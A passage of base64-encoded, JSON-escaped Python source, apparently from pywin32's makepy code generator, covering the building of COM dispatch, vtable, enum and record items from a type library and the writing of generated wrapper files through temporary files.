xhc3NJdGVtKGluZm8sIGF0dHIsIGRvYylcbiAgICAgICAgcmV0dXJuIG5ld0l0ZW0sIGNoaWxkX2luZm9zXG5cbiAgICBkZWYgX0J1aWxkX0NvQ2xhc3NDaGlsZHJlbihzZWxmLCBjb2NsYXNzLCBjb2NsYXNzX2luZm8sIG9sZUl0ZW1zLCB2dGFibGVJdGVtcyk6XG4gICAgICAgIHNvdXJjZXMgPSB7fVxuICAgICAgICBpbnRlcmZhY2VzID0ge31cbiAgICAgICAgZm9yIGluZm8sIGluZm9fdHlwZSwgcmVmVHlwZSwgZG9jLCByZWZBdHRyLCBmbGFncyBpbiBjb2NsYXNzX2luZm86XG4gICAgICAgICAgICAjICAgICAgICAgIHN5cy5zdGRlcnIud3JpdGUoIkF0dHIgdHlwZWZsYWdzIGZvciBjb2NsYXNzIHJlZmVyZW5jZWQgb2JqZWN0ICVzPSVkICglZCksIHR5cGVraW5kPSVkXFxuIiAlIChuYW1lLCByZWZBdHRyLndUeXBlRmxhZ3MsIHJlZkF0dHIud1R5cGVGbGFncyAmIHB5dGhvbmNvbS5UWVBFRkxBR19GRFVBTCxyZWZBdHRyLnR5cGVraW5kKSlcbiAgICAgICAgICAgIGlmIHJlZkF0dHIudHlwZWtpbmQgPT0gcHl0aG9uY29tLlRLSU5EX0RJU1BBVENIIG9yIChcbiAgICAgICAgICAgICAgICByZWZBdHRyLnR5cGVraW5kID09IHB5dGhvbmNvbS5US0lORF9JTlRFUkZBQ0VcbiAgICAgICAgICAgICAgICBhbmQgcmVmQXR0clsxMV0gJiBweXRob25jb20uVFlQRUZMQUdfRkRJU1BBVENIQUJMRVxuICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICBjbHNpZCA9IHJlZkF0dHJbMF1cbiAgICAgICAgICAgICAgICBpZiBjbHNpZCBpbiBvbGVJdGVtczpcbiAgICAgICAgICAgICAgICAgICAgZGlzcEl0ZW0gPSBvbGVJdGVtc1tjbHNpZF1cbiAgICAgICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgICAgICBkaXNwSXRlbSA9IERpc3BhdGNoSXRlbShyZWZUeXBlLCByZWZBdHRyLCBkb2MpXG4gICAgICAgICAgICAgICAgICAgIG9sZUl0ZW1zW2Rpc3BJdGVtLmNsc2lkXSA9IGRpc3BJdGVtXG4gICAgICAgICAgICAgICAgZGlzcEl0ZW0uY29jbGFzc19jbHNpZCA9IGNvY2xhc3MuY2xzaWRcbiAgICAgICAgICAgICAgICBpZiBmbGFncyAmIHB5dGhvbmNvbS5JTVBMVFlQRUZMQUdfRlNPVVJDRTpcbiAgICAgICAgICAgICAgICAgICAgZGlzcEl0ZW0uYklzU2luayA9IDFcbiAgICAgICAgICAgICAgICAgICAgc291cmNlc1tkaXNwSXRlbS5jbHNpZF0gPSAoZGlzcEl0ZW0sIGZsYWdzKVxuICAgICAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgICAgIGludGVyZmFjZXNbZGlzcEl0ZW0uY2xzaWRdID0gKGRpc3BJdGVtLCBmbGFncylcbiAgICAgICAgICAgICAgICAjIElmIGR1YWwgaW50ZXJmYWNlLCBtYWtlIGRvIHRoYXQgdG9vLlxuICAgICAgICAgICAgICAgIGlmIGNsc2lkIG5vdCBpbiB2dGFibGVJdGVtcyBhbmQgcmVmQXR0clsxMV0gJiBweXRob25jb20uVFlQRUZMQUdfRkRVQUw6XG4gICAgICAgICAgICAgICAgICAgIHJlZlR5cGUgPSByZWZUeXBlLkdldFJlZlR5cGVJbmZvKHJlZlR5cGUuR2V0UmVmVHlwZU9mSW1wbFR5cGUoLTEpKVxuICAgICAgICAgICAgICAgICAgICByZWZBdHRyID0gcmVmVHlwZS5HZXRUeXBlQXR0cigpXG4gICAgICAgICAgICAgICAgICAgIGFzc2VydCAoXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZBdHRyLnR5cGVraW5kID09IHB5dGhvbmNvbS5US0lORF9JTlRFUkZBQ0VcbiAgICAgICAgICAgICAgICAgICAgKSwgIm11c3QgYmUgaW50ZXJmYWNlIGJ5bm93ISJcbiAgICAgICAgICAgICAgICAgICAgdnRhYmxlSXRlbSA9IFZUYWJsZUl0ZW0ocmVmVHlwZSwgcmVmQXR0ciwgZG9jKVxuICAgICAgICAgICAgICAgICAgICB2dGFibGVJdGVtc1tjbHNpZF0gPSB2dGFibGVJdGVtXG4gICAgICAgIGNvY2xhc3Muc291cmNlcyA9IGxpc3Qoc291cmNlcy52YWx1ZXMoKSlcbiAgICAgICAgY29jbGFzcy5pbnRlcmZhY2VzID0gbGlzdChpbnRlcmZhY2VzLnZhbHVlcygpKVxuXG4gICAgZGVmIF9CdWlsZF9JbnRlcmZhY2Uoc2VsZiwgdHlwZV9pbmZvX3R1cGxlKTpcbiAgICAgICAgaW5mbywgaW5mb3R5cGUsIGRvYywgYXR0ciA9IHR5cGVfaW5mb190dXBsZVxuICAgICAgICBvbGVJdGVtID0gdnRhYmxlSXRlbSA9IE5vbmVcbiAgICAgICAgaWYgaW5mb3R5cGUgPT0gcHl0aG9uY29tLlRLSU5EX0RJU1BBVENIIG9yIChcbiAgICAgICAgICAgIGluZm90eXBlID09IHB5dGhvbmNvbS5US0lORF9JTlRFUkZBQ0VcbiAgICAgICAgICAgIGFuZCBhdHRyWzExXSAmIHB5dGhvbmNvbS5UWVBFRkxBR19GRElTUEFUQ0hBQkxFXG4gICAgICAgICk6XG4gICAgICAgICAgICBvbGVJdGVtID0gRGlzcGF0Y2hJdGVtKGluZm8sIGF0dHIsIGRvYylcbiAgICAgICAgICAgICMgSWYgdGhpcyBESVNQQVRDSCBpbnRlcmZhY2UgZHVhbCwgdGhlbiBidWlsZCB0aGF0IHRvby5cbiAgICAgICAgICAgIGlmIGF0dHIud1R5cGVGbGFncyAmIHB5dGhvbmNvbS5UWVBFRkxBR19GRFVBTDpcbiAgICAgICAgICAgICAgICAjIEdldCB0aGUgdnRhYmxlIGludGVyZmFjZVxuICAgICAgICAgICAgICAgIHJlZmh0eXBlID0gaW5mby5HZXRSZWZUeXBlT2ZJbXBsVHlwZSgtMSlcbiAgICAgICAgICAgICAgICBpbmZvID0gaW5mby5HZXRSZWZUeXBlSW5mbyhyZWZodHlwZSlcbiAgICAgICAgICAgICAgICBhdHRyID0gaW5mby5HZXRUeXBlQXR0cigpXG4gICAgICAgICAgICAgICAgaW5mb3R5cGUgPSBweXRob25jb20uVEtJTkRfSU5URVJGQUNFXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGluZm90eXBlID0gTm9uZVxuICAgICAgICBhc3NlcnQgaW5mb3R5cGUgaW4gW1xuICAgICAgICAgICAgTm9uZSxcbiAgICAgICAgICAgIHB5dGhvbmNvbS5US0lORF9JTlRFUkZBQ0UsXG4gICAgICAgIF0sICJNdXN0IGJlIGEgcmVhbCBpbnRlcmZhY2UgYXQgdGhpcyBwb2ludCJcbiAgICAgICAgaWYgaW5mb3R5cGUgPT0gcHl0aG9uY29tLlRLSU5EX0lOVEVSRkFDRTpcbiAgICAgICAgICAgIHZ0YWJsZUl0ZW0gPSBWVGFibGVJdGVtKGluZm8sIGF0dHIsIGRvYylcbiAgICAgICAgcmV0dXJuIG9sZUl0ZW0sIHZ0YWJsZUl0ZW1cblxuICAgIGRlZiBCdWlsZE9sZUl0ZW1zRnJvbVR5cGUoc2VsZik6XG4gICAgICAgIGFzc2VydCAoXG4gICAgICAgICAgICBzZWxmLmJCdWlsZEhpZGRlblxuICAgICAgICApLCAiVGhpcyBjb2RlIGRvZXNudCBsb29rIGF0IHRoZSBoaWRkZW4gZmxhZyAtIEkgdGhvdWdodCBldmVyeW9uZSBzZXQgaXQgdHJ1ZSE/IT8hIlxuICAgICAgICBvbGVJdGVtcyA9IHt9XG4gICAgICAgIGVudW1JdGVtcyA9IHt9XG4gICAgICAgIHJlY29yZEl0ZW1zID0ge31cbiAgICAgICAgdnRhYmxlSXRlbXMgPSB7fVxuXG4gICAgICAgIGZvciB0eXBlX2luZm9fdHVwbGUgaW4gc2VsZi5Db2xsZWN0T2xlSXRlbUluZm9zRnJvbVR5cGUoKTpcbiAgICAgICAgICAgIGluZm8sIGluZm90eXBlLCBkb2MsIGF0dHIgPSB0eXBlX2luZm9fdHVwbGVcbiAgICAgICAgICAgIGNsc2lkID0gYXR0clswXVxuICAgICAgICAgICAgaWYgaW5mb3R5cGUgPT0gcHl0aG9uY29tLlRLSU5EX0VOVU0gb3IgaW5mb3R5cGUgPT0gcHl0aG9uY29tLlRLSU5EX01PRFVMRTpcbiAgICAgICAgICAgICAgICBuZXdJdGVtID0gRW51bWVyYXRpb25JdGVtKGluZm8sIGF0dHIsIGRvYylcbiAgICAgICAgICAgICAgICBlbnVtSXRlbXNbbmV3SXRlbS5kb2NbMF1dID0gbmV3SXRlbVxuICAgICAgICAgICAgIyBXZSBuZXZlciBoaWRlIGludGVyZmFjZXMgKE1TQWNjZXNzLCBmb3IgZXhhbXBsZSwgbm9taW5hdGVzIGludGVyZmFjZXMgYXNcbiAgICAgICAgICAgICMgaGlkZGVuLCBhc3N1bWluZyB0aGF0IHlvdSBvbmx5IGV2ZXIgdXNlIHRoZW0gdmlhIHRoZSBDb0NsYXNzKVxuICAgICAgICAgICAgZWxpZiBpbmZvdHlwZSBpbiBbcHl0aG9uY29tLlRLSU5EX0RJU1BBVENILCBweXRob25jb20uVEtJTkRfSU5URVJGQUNFXTpcbiAgICAgICAgICAgICAgICBpZiBjbHNpZCBub3QgaW4gb2xlSXRlbXM6XG4gICAgICAgICAgICAgICAgICAgIG9sZUl0ZW0sIHZ0YWJsZUl0ZW0gPSBzZWxmLl9CdWlsZF9JbnRlcmZhY2UodHlwZV9pbmZvX3R1cGxlKVxuICAgICAgICAgICAgICAgICAgICBvbGVJdGVtc1tjbHNpZF0gPSBvbGVJdGVtICAjIEV2ZW4gIk5vbmUiIGdvZXMgaW4gaGVyZS5cbiAgICAgICAgICAgICAgICAgICAgaWYgdnRhYmxlSXRlbSBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgICAgICAgICAgICAgIHZ0YWJsZUl0ZW1zW2Nsc2lkXSA9IHZ0YWJsZUl0ZW1cbiAgICAgICAgICAgIGVsaWYgKFxuICAgICAgICAgICAgICAgIGluZm90eXBlID09IHB5dGhvbmNvbS5US0lORF9SRUNPUkQgb3IgaW5mb3R5cGUgPT0gcHl0aG9uY29tLlRLSU5EX1VOSU9OXG4gICAgICAgICAgICApOlxuICAgICAgICAgICAgICAgIG5ld0l0ZW0gPSBSZWNvcmRJdGVtKGluZm8sIGF0dHIsIGRvYylcbiAgICAgICAgICAgICAgICByZWNvcmRJdGVtc1tuZXdJdGVtLmNsc2lkXSA9IG5ld0l0ZW1cbiAgICAgICAgICAgIGVsaWYgaW5mb3R5cGUgPT0gcHl0aG9uY29tLlRLSU5EX0FMSUFTOlxuICAgICAgICAgICAgICAgICMgV2UgZG9udCBjYXJlIGFib3V0IGFsaWFzXCcgLSBoYW5kbGVkIGludHJpbnNpY2x5LlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgICAgICBlbGlmIGluZm90eXBlID09IHB5dGhvbmNvbS5US0lORF9DT0NMQVNTOlxuICAgICAgICAgICAgICAgIG5ld0l0ZW0sIGNoaWxkX2luZm9zID0gc2VsZi5fQnVpbGRfQ29DbGFzcyh0eXBlX2luZm9fdHVwbGUpXG4gICAgICAgICAgICAgICAgc2VsZi5fQnVpbGRfQ29DbGFzc0NoaWxkcmVuKG5ld0l0ZW0sIGNoaWxkX2luZm9zLCBvbGVJdGVtcywgdnRhYmxlSXRlbXMpXG4gICAgICAgICAgICAgICAgb2xlSXRlbXNbbmV3SXRlbS5jbHNpZF0gPSBuZXdJdGVtXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIHNlbGYucHJvZ3Jlc3MuTG9nV2FybmluZygiVW5rbm93biBUS0lORCBmb3VuZDogJWQiICUgaW5mb3R5cGUpXG5cbiAgICAgICAgcmV0dXJuIG9sZUl0ZW1zLCBlbnVtSXRlbXMsIHJlY29yZEl0ZW1zLCB2dGFibGVJdGVtc1xuXG4gICAgZGVmIG9wZW5fd3JpdGVyKHNlbGYsIGZpbGVuYW1lLCBlbmNvZGluZz0ibWJjcyIpOlxuICAgICAgICAjIEEgcGxhY2UgdG8gcHV0IGNvZGUgdG8gb3BlbiBhIGZpbGUgd2l0aCB0aGUgYXBwcm9wcmlhdGUgZW5jb2RpbmcuXG4gICAgICAgICMgRG9lcyAqbm90KiBzZXQgc2VsZi5maWxlIC0ganVzdCBvcGVucyBhbmQgcmV0dXJucyBhIGZpbGUuXG4gICAgICAgICMgQWN0dWFsbHkgcmV0dXJucyBhIGhhbmRsZSB0byBhIHRlbXAgZmlsZSAtIGZpbmlzaF93cml0ZXIgdGhlbiBkZWxldGVzXG4gICAgICAgICMgdGhlIGZpbGVuYW1lIGFza2VkIGZvciBhbmQgcHV0cyBldmVyeXRoaW5nIGJhY2sgaW4gcGxhY2UuICBUaGlzXG4gICAgICAgICMgaXMgc28gZXJyb3JzIGRvblwndCBsZWF2ZSBhIDEvMiBnZW5lcmF0ZWQgZmlsZSBhcm91bmQgY2F1c2luZyBiaXphcnJlXG4gICAgICAgICMgZXJyb3JzIGxhdGVyLCBhbmQgc28gdGhhdCBtdWx0aXBsZSBwcm9jZXNzZXMgd3JpdGluZyB0aGUgc2FtZSBmaWxlXG4gICAgICAgICMgZG9uXCd0IHN0ZXAgb24gZWFjaCBvdGhlcnNcJyB0b2VzLlxuICAgICAgICAjIENvdWxkIGJlIGEgY2xhc3NtZXRob2Qgb25lIGRheS4uLlxuICAgICAgICB0ZW1wX2ZpbGVuYW1lID0gc2VsZi5nZXRfdGVtcF9maWxlbmFtZShmaWxlbmFtZSlcbiAgICAgICAgcmV0dXJuIG9wZW4odGVtcF9maWxlbmFtZSwgInd0IiwgZW5jb2Rpbmc9ZW5jb2RpbmcpXG5cbiAgICBkZWYgZmluaXNoX3dyaXRlcihzZWxmLCBmaWxlbmFtZSwgZiwgd29ya2VkKTpcbiAgICAgICAgZi5jbG9zZSgpXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIG9zLnVubGluayhmaWxlbmFtZSlcbiAgICAgICAgZXhjZXB0IG9zLmVycm9yOlxuICAgICAgICAgICAgcGFzc1xuICAgICAgICB0ZW1wX2ZpbGVuYW1lID0gc2VsZi5nZXRfdGVtcF9maWxlbmFtZShmaWxlbmFtZSlcbiAgICAgICAgaWYgd29ya2VkOlxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIG9zLnJlbmFtZSh0ZW1wX2ZpbGVuYW1lLCBmaWxlbmFtZSlcbiAgICAgICAgICAgIGV4Y2VwdCBvcy5lcnJvcjpcbiAgICAgICAgICAgICAgICAjIElmIHdlIGFyZSByZWFsbHkgdW5sdWNreSwgYW5vdGhlciBwcm9jZXNzIG1heSBoYXZlIHdyaXR0ZW4gdGhlXG4gICAgICAgICAgICAgICAgIyBmaWxlIGluIGJldHdlZW4gb3VyIGNhbGxzIHRvIG9zLnVubGluayBhbmQgb3MucmVuYW1lLiBTbyB0cnlcbiAgICAgICAgICAgICAgICAjIGFnYWluLCBidXQgb25seSBvbmNlLlxuICAgICAgICAgICAgICAgICMgVGhlcmUgYXJlIHN0aWxsIHNvbWUgcmFjZSBjb25kaXRpb25zLCBidXQgdGhleSBzZWVtIGRpZmZpY3VsdCB0b1xuICAgICAgICAgICAgICAgICMgZml4LCBhbmQgdGhleSBwcm9iYWJseSBvY2N1ciBtdWNoIGxlc3MgZnJlcXVlbnRseTpcbiAgICAgICAgICAgICAgICAjICogVGhlIG9zLnJlbmFtZSBmYWlsdXJlIGNvdWxkIG9jY3VyIG1vcmUgdGhhbiBvbmNlIGlmIG1vcmUgdGhhblxuICAgICAgICAgICAgICAgICMgICB0d28gcHJvY2Vzc2VzIGFyZSBpbnZvbHZlZC5cbiAgICAgICAgICAgICAgICAjICogSW4gYmV0d2VlbiBvcy51bmxpbmsgYW5kIG9zLnJlbmFtZSwgYW5vdGhlciBwcm9jZXNzIGNvdWxkIHRyeVxuICAgICAgICAgICAgICAgICMgICB0byBpbXBvcnQgdGhlIG1vZHVsZSwgaGF2aW5nIHNlZW4gdGhhdCBpdCBhbHJlYWR5IGV4aXN0cy5cbiAgICAgICAgICAgICAgICAjICogSWYgYW5vdGhlciBwcm9jZXNzIHN0YXJ0cyBhIENPTSBzZXJ2ZXIgd2hpbGUgd2UgYXJlIHN0aWxsXG4gICAgICAgICAgICAgICAgIyAgIGdlbmVyYXRpbmcgX19pbml0X18ucHksIHRoYXQgcHJvY2VzcyBzZWVzIHRoYXQgdGhlIGZvbGRlclxuICAgICAgICAgICAgICAgICMgICBhbHJlYWR5IGV4aXN0cyBhbmQgYXNzdW1lcyB0aGF0IF9faW5pdF9fLnB5IGlzIGFscmVhZHkgdGhlcmVcbiAgICAgICAgICAgICAgICAjICAgYXMgd2VsbC5cbiAgICAgICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgICAgIG9zLnVubGluayhmaWxlbmFtZSlcbiAgICAgICAgICAgICAgICBleGNlcHQgb3MuZXJyb3I6XG4gICAgICAgICAgICAgICAgICAgIHBhc3NcbiAgICAgICAgICAgICAgICBvcy5yZW5hbWUodGVtcF9maWxlbmFtZSwgZmlsZW5hbWUpXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBvcy51bmxpbmsodGVtcF9maWxlbmFtZSlcblxuICAgIGRlZiBnZXRfdGVtcF9maWxlbmFtZShzZWxmLCBmaWxlbmFtZSk6XG4gICAgICAgIHJldHVybiAiJXMuJWQudGVtcCIgJSAoZmlsZW5hbWUsIG9zLmdldHBpZCgpKVxuXG4gICAgZGVmIGdlbmVyYXRlKHNlbGYsIGZpbGUsIGlzX2Zvcl9kZW1hbmQ9MCk6XG4gICAgICAgIGlmIGlzX2Zvcl9kZW1hbmQ6XG4gICAgICAgICAgICBzZWxmLmdlbmVyYXRlX3R5cGUgPSBHRU5fREVNQU5EX0JBU0VcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIHNlbGYuZ2VuZXJhdGVfdHlwZSA9IEdFTl9GVUxMXG4gICAgICAgIHNlbGYuZmlsZSA9IGZpbGVcbiAgICAgICAgc2VsZi5kb19nZW5lcmF0ZSgpXG4gICAgICAgIHNlbGYuZmlsZSA9IE5vbmVcbiAgICAgICAgc2VsZi5wcm9ncmVzcy5GaW5pc2hlZCgpXG5cbiAgICBkZWYgZG9fZ2VuX2ZpbGVfaGVhZGVyKHNlbGYpOlxuICAgICAgICBsYSA9IHNlbGYudHlwZWxpYi5HZXRMaWJBdHRyKClcbiAgICAgICAgbW9kdWxlRG9jID0gc2VsZi50eXBlbGliLkdldERvY3VtZW50YXRpb24oLTEpXG4gICAgICAgIGRvY0Rlc2MgPSAiIlxuICAgICAgICBpZiBtb2R1bGVEb2NbMV06XG4gICAgICAgICAgICBkb2NEZXNjID0gbW9kdWxlRG9jWzFdXG5cbiAgICAgICAgIyBSZXNldCBhbGwgdGhlIFwncGVyIGZpbGVcJyBzdGF0ZVxuICAgICAgICBzZWxmLmJIYXZlV3JpdHRlbkRpc3BhdGNoQmFzZUNsYXNzID0gMFxuICAgICAgICBzZWxmLmJIYXZlV3JpdHRlbkNvQ2xhc3NCYXNlQ2xhc3MgPSAwXG4gICAgICAgIHNlbGYuYkhhdmVXcml0dGVuRXZlbnRCYXNlQ2xhc3MgPSAwXG4gICAgICAgICMgWW91IG11c3QgcHJvdmlkZSBhIGZpbGUgY29ycmVjdGx5IGNvbmZpZ3VyZWQgZm9yIHdyaXRpbmcgdW5pY29kZS5cbiAgICAgICAgIyBXZSBhc3NlcnQgdGhpcyBpcyBpdCBtYXkgaW5kaWNhdGUgc29tZXdoZXJlIGluIHB5d2luMzIgdGhhdCBuZWVkc1xuICAgICAgICAjIHVwZ3JhZGluZy5cbiAgICAgICAgYXNzZXJ0IHNlbGYuZmlsZS5lbmNvZGluZywgc2VsZi5maWxlXG4gICAgICAgIGVuY29kaW5nID0gc2VsZi5maWxlLmVuY29kaW5nICAjIG9yICJtYmNzIlxuXG4gICAgICAgIHByaW50KCIjIC0qLSBjb2Rpbmc6ICVzIC0qLSIgJSAoZW5jb2RpbmcsKSwgZmlsZT1zZWxmLmZpbGUpXG4gICAgICAgIHByaW50KCIjIENyZWF0ZWQgYnkgbWFrZXB5LnB5IHZlcnNpb24gJXMiICUgKG1ha2VweV92ZXJzaW9uLCksIGZpbGU9c2VsZi5maWxlKVxuICAgICAgICBwcmludChcbiAgICAgICAgICAgICIjIEJ5IHB5dGhvbiB2ZXJzaW9uICVzIiAlIChzeXMudmVyc2lvbi5yZXBsYWNlKCJcXG4iLCAiLSIpLCksIGZpbGU9c2VsZi5maWxlXG4gICAgICAgIClcbiAgICAgICAgaWYgc2VsZi5zb3VyY2VGaWxlbmFtZTpcbiAgICAgICAgICAgIHByaW50KFxuICAgICAgICAgICAgICAgICIjIEZyb20gdHlwZSBsaWJyYXJ5IFwnJXNcJyIgJSAob3MucGF0aC5zcGxpdChzZWxmLnNvdXJjZUZpbGVuYW1lKVsxXSwpLFxuICAgICAgICAgICAgICAgIGZpbGU9c2VsZi5maWxlLFxuICAgICAgICAgICAgKVxuICAgICAgICBwcmludCgiIyBPbiAlcyIgJSB0aW1lLmN0aW1lKHRpbWUudGltZSgpKSwgZmlsZT1zZWxmLmZpbGUpXG5cbiAgICAgICAgcHJpbnQoYnVpbGQuX21ha2VEb2NTdHJpbmcoZG9jRGVzYyksIGZpbGU9c2VsZi5maWxlKVxuXG4gICAgICAgIHByaW50KCJtYWtlcHlfdmVyc2lvbiA9IiwgcmVwcihtYWtlcHlfdmVyc2lvbiksIGZpbGU9c2VsZi5maWxlKVxuICAgICAgICBwcmludCgicHl0aG9uX3ZlcnNpb24gPSAweCV4IiAlIChzeXMuaGV4dmVyc2lvbiwpLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoZmlsZT1zZWxmLmZpbGUpXG4gICAgICAgIHByaW50KFxuICAgICAgICAgICAgImltcG9ydCB3aW4zMmNvbS5jbGllbnQuQ0xTSURUb0NsYXNzLCBweXRob25jb20sIHB5d2ludHlwZXMiLCBmaWxlPXNlbGYuZmlsZVxuICAgICAgICApXG4gICAgICAgIHByaW50KCJpbXBvcnQgd2luMzJjb20uY2xpZW50LnV0aWwiLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoImZyb20gcHl3aW50eXBlcyBpbXBvcnQgSUlEIiwgZmlsZT1zZWxmLmZpbGUpXG4gICAgICAgIHByaW50KCJmcm9tIHdpbjMyY29tLmNsaWVudCBpbXBvcnQgRGlzcGF0Y2giLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoZmlsZT1zZWxmLmZpbGUpXG4gICAgICAgIHByaW50KFxuICAgICAgICAgICAgIiMgVGhlIGZvbGxvd2luZyAzIGxpbmVzIG1heSBuZWVkIHR3ZWFraW5nIGZvciB0aGUgcGFydGljdWxhciBzZXJ2ZXIiLFxuICAgICAgICAgICAgZmlsZT1zZWxmLmZpbGUsXG4gICAgICAgIClcbiAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAiIyBDYW5kaWRhdGVzIGFyZSBweXRob25jb20uTWlzc2luZywgLkVtcHR5IGFuZCAuQXJnTm90Rm91bmQiLFxuICAgICAgICAgICAgZmlsZT1zZWxmLmZpbGUsXG4gICAgICAgIClcbiAgICAgICAgcHJpbnQoImRlZmF1bHROYW1lZE9wdEFyZz1weXRob25jb20uRW1wdHkiLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoImRlZmF1bHROYW1lZE5vdE9wdEFyZz1weXRob25jb20uRW1wdHkiLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoImRlZmF1bHRVbm5hbWVkQXJnPXB5dGhvbmNvbS5FbXB0eSIsIGZpbGU9c2VsZi5maWxlKVxuICAgICAgICBwcmludChmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoIkNMU0lEID0gIiArIHJlcHIobGFbMF0pLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoIk1ham9yVmVyc2lvbiA9ICIgKyBzdHIobGFbM10pLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoIk1pbm9yVmVyc2lvbiA9ICIgKyBzdHIobGFbNF0pLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoIkxpYnJhcnlGbGFncyA9ICIgKyBzdHIobGFbNV0pLCBmaWxlPXNlbGYuZmlsZSlcbiAgICAgICAgcHJpbnQoIkxDSUQgPSAiICsgaGV4KGxhWzFdKSwgZmlsZT1zZWxmLmZpbGUpXG4gICAgICAgIHByaW50KGZpbGU9c2VsZi5maWxlKVxuXG4gICAgZGVmIGRvX2dlbmVyYXRlKHNlbGYpOlxuICAgICAgICBtb2R1bGVEb2MgPSBzZWxmLnR5cGVsaWIuR2V0RG9jdW1lbnRhdGlvbigtMSlcbiAgICAgICAgc3RyZWFtID0gc2VsZi5maWxlXG4gICAgICAgIGRvY0Rlc2MgPSAiIlxuICAgICAgICBpZiBtb2R1bGVEb2NbMV06XG4gICAgICAgICAgICBkb2NEZXNjID0gbW9kdWxlRG9jWzFdXG4gICAgICAgIHNlbGYucHJvZ3Jlc3MuU3RhcnRpbmcoZG9jRGVzYylcbiAgICAgICAgc2VsZi5wcm9ncmVzcy5TZXREZXNjcmlwdGlvbigiQnVpbGRpbmcgZGVmaW5pdGlvbnMgZnJvbSB0eXBlIGxpYnJhcnkuLi4iKVxuXG4gICAgICAgIHNlbGYuZG9fZ2VuX2ZpbGVfaGVhZGVyKClcblxuICAgICAgICBvbGVJdGVtcywgZW51bUl0ZW1zLCByZWNvcmRJdGVtcywgdnRhYmxlSXRlbXMgPSBzZWxmLkJ1aWxkT2xlSXRlbXNGcm9tVHlwZSgpXG5cbiAgICAgICAgc2VsZi5wcm9ncmVzcy5TZXREZXNjcmlwdGlvbihcbiAgICAgICAgICAgICJHZW5lcmF0aW5nLi4uIiwgbGVuKG9sZUl0ZW1zKSArIGxlbihlbnVtSXRlbXMpICsgbGVuKHZ0YWJsZUl0ZW1zKVxuICAgICAgICApXG5cbiAgICAgICAgIyBHZW5lcmF0ZSB0aGUgY29uc3RhbnRzIGFuZCB0aGVpciBzdXBwb3J0LlxuICAgICAgICBpZiBlbnVtSXRlbXM6XG4gICAgICAgICAgICBwcmludCgiY2xhc3MgY29uc3RhbnRzOiIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgaXRlbXMgPSBsaXN0KGVudW1JdGVtcy52YWx1ZXMoKSlcbiAgICAgICAgICAgIGl0ZW1zLnNvcnQoKVxuICAgICAgICAgICAgbnVtX3dyaXR0ZW4gPSAwXG4gICAgICAgICAgICBmb3Igb2xlaXRlbSBpbiBpdGVtczpcbiAgICAgICAgICAgICAgICBudW1fd3JpdHRlbiArPSBvbGVpdGVtLldyaXRlRW51bWVyYXRpb25JdGVtcyhzdHJlYW0pXG4gICAgICAgICAgICAgICAgc2VsZi5wcm9ncmVzcy5UaWNrKClcbiAgICAgICAgICAgIGlmIG5vdCBudW1fd3JpdHRlbjpcbiAgICAgICAgICAgICAgICBwcmludCgiXFx0cGFzcyIsIGZpbGU9c3RyZWFtKVxuICAgICAgICAgICAgcHJpbnQoZmlsZT1zdHJlYW0pXG5cbiAgICAgICAgaWYgc2VsZi5nZW5lcmF0ZV90eXBlID09IEdFTl9GVUxMOlxuICAgICAgICAgICAgaXRlbXMgPSBbbCBmb3IgbCBpbiBvbGVJdGVtcy52YWx1ZXMoKSBpZiBsIGlzIG5vdCBOb25lXVxuICAgICAgICAgICAgaXRlbXMuc29ydCgpXG4gICAgICAgICAgICBmb3Igb2xlaXRlbSBpbiBpdGVtczpcbiAgICAgICAgICAgICAgICBzZWxmLnByb2dyZXNzLlRpY2soKVxuICAgICAgICAgICAgICAgIG9sZWl0ZW0uV3JpdGVDbGFzcyhzZWxmKVxuXG4gICAgICAgICAgICBpdGVtcyA9IGxpc3QodnRhYmxlSXRlbXMudmFsdWVzKCkpXG4gICAgICAgICAgICBpdGVtcy5zb3J0KClcbiAgICAgICAgICAgIGZvciBvbGVpdGVtIGluIGl0ZW1zOlxuICAgICAgICAgICAgICAgIHNlbGYucHJvZ3Jlc3MuVGljaygpXG4gICAgICAgICAgICAgICAgb2xlaXRlbS5Xcml0ZUNsYXNzKHNlbGYpXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBzZWxmLnByb2dyZXNzLlRpY2sobGVuKG9sZUl0ZW1zKSArIGxlbih2dGFibGVJdGVtcykpXG5cbiAgICAgICAgcHJpbnQoIlJlY29yZE1hcCA9IHsiLCBmaWxlPXN0cmVhbSlcbiAgICAgICAgZm9yIHJlY29yZCBpbiByZWNvcmRJdGVtcy52YWx1ZXMoKTpcbiAgICAgICAgICAgIGlmIHJlY29yZC5jbHNpZCA9PSBweXRob25jb20uSUlEX05VTEw6XG4gICAgICAgICAgICAgICAgcHJpbnQoXG4gICAgICAgICAgICAgICAgICAgICJcXHQjIyMlczogJXMsICMgUmVjb3JkIGRpc2FibGVkIGJlY2F1c2UgaXQgZG9lc25cJ3QgaGF2ZSBhIG5vbi1udWxsIEdVSUQiXG4gICAgICAgICAgICAgICAgICAgICUgKHJlcHIocmVjb3JkLmRvY1swXSksIHJlcHIoc3RyKHJlY29yZC5jbHNpZCkpKSxcbiAgICAgICAgICAgICAgI